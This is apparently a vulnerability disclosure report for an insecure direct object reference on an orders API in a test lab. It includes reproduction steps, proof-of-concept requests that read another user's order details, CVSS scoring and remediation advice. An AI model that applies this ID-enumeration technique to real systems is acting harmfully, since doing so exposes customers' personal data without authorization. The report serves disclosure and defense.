# Insecure Direct Object Reference (IDOR) / Broken Object Level Authorization on `/api/orders/{id}` Endpoint

## Summary
An authenticated user (User A) can access order details belonging to other users by manipulating the `order_id` parameter in the `GET /api/orders/{id}` request. The application fails to verify that the requested order belongs to the authenticated user, resulting in unauthorized disclosure of personally identifiable information (PII) including full name, shipping address, and phone number.

## OWASP Category / CWE
- **OWASP API Top 10 2023:** API1:2023 – Broken Object Level Authorization (BOLA)
- **OWASP Top 10 2021:** A01:2021 – Broken Access Control
- **CWE-639:** Authorization Bypass Through User-Controlled Key

## Severity
**CVSS v3.1 Vector:** `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N`  
**Base Score:** 7.5 (High)

**Reasoning:**
- **Attack Vector (AV:N):** Exploitable remotely over the network.
- **Attack Complexity (AC:L):** No specialized conditions; simply change the numeric ID.
- **Privileges Required (PR:L):** Requires a valid authenticated session (low privileges).
- **User Interaction (UI:N):** No interaction from another user needed.
- **Scope (S:U):** No impact beyond the vulnerable component.
- **Confidentiality (C:H):** Full exposure of sensitive PII (name, address, phone) of other users.
- **Integrity (I:N):** No data modification observed.
- **Availability (A:N):** No impact on service availability.

## Affected Asset
- **Host:** `shop.example.com` (test lab)
- **Endpoint:** `GET /api/orders/{order_id}`
- **Parameter:** `order_id` (path parameter)

## Steps to Reproduce
1. Log in to the application as **User A** (valid credentials).
2. Send a request to `GET /api/orders/123` (an order owned by User A) and observe the successful response containing order details.
3. Modify the `order_id` path parameter from `123` to `124` (an order owned by a different user).
4. Send the request `GET /api/orders/124`.
5. Observe that the response returns the full order details of another user, including name, address, and phone number, without any authorization error (HTTP 200 OK).

## Proof of Concept
**Request 1 (Authorized – Own Order):**
```
GET /api/orders/123 HTTP/1.1
Host: shop.example.com
Authorization: Bearer <user_a_token>
```

**Response 1:**
```json
HTTP/1.1 200 OK
Content-Type: application/json

{
  "order_id": 123,
  "user_id": 1001,
  "customer_name": "Alice UserA",
  "shipping_address": "123 Main St, City, Country",
  "phone": "+1-555-0101",
  "items": [...],
  "total": 49.99
}
```

**Request 2 (Unauthorized – Another User's Order):**
```
GET /api/orders/124 HTTP/1.1
Host: shop.example.com
Authorization: Bearer <user_a_token>
```

**Response 2:**
```json
HTTP/1.1 200 OK
Content-Type: application/json

{
  "order_id": 124,
  "user_id": 1002,
  "customer_name": "Bob UserB",
  "shipping_address": "456 Oak Ave, Town, Country",
  "phone": "+1-555-0102",
  "items": [...],
  "total": 99.50
}
```

*Note: The `user_id` in the response (1002) does not match the authenticated user (1001), confirming the authorization bypass.*

## Impact
- **Data Exposure:** Any authenticated user can enumerate order IDs and harvest PII (full names, physical addresses, phone numbers) of all other customers.
- **Privacy Violation:** Direct breach of data protection regulations (e.g., GDPR, CCPA) due to uncontrolled access to personal data.
- **Business Risk:** Enables targeted phishing, social engineering, or physical security threats (address exposure). Undermines customer trust and may result in regulatory fines.
- **Scalability:** The vulnerability is trivially automatable; a simple script can dump the entire order database.

## Remediation
1. **Implement Object-Level Authorization Checks:**  
   In the order retrieval handler, verify that the `user_id` associated with the requested `order_id` matches the `user_id` from the authenticated session (JWT claim, session cookie, etc.). Return `403 Forbidden` or `404 Not Found` on mismatch.

2. **Use Indirect Object References (Map):**  
   Replace direct numeric IDs with unpredictable, user-specific tokens (e.g., UUIDs mapped server-side to orders) so users cannot guess other users' references.

3. **Add Unit/Integration Tests:**  
   Write tests that attempt cross-user order access and assert a `403`/`404` response.

4. **Logging & Monitoring:**  
   Log authorization failures (user ID, requested order ID, IP) and alert on repeated attempts.

5. **API Gateway / WAF Rule (Defense-in-Depth):**  
   Deploy a rule that flags repeated requests to `/api/orders/*` with varying IDs from the same session.

## References
- OWASP API Security Top 10 2023 – [API1: Broken Object Level Authorization](https://owasp.org/API-Security/editions/2023/en/0x11-t1/)
- OWASP Top 10 2021 – [A01: Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- CWE-639 – [Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html)
- PortSwigger Web Security Academy – [Insecure Direct Object References (IDOR)](https://portswigger.net/web-security/access-control/idor)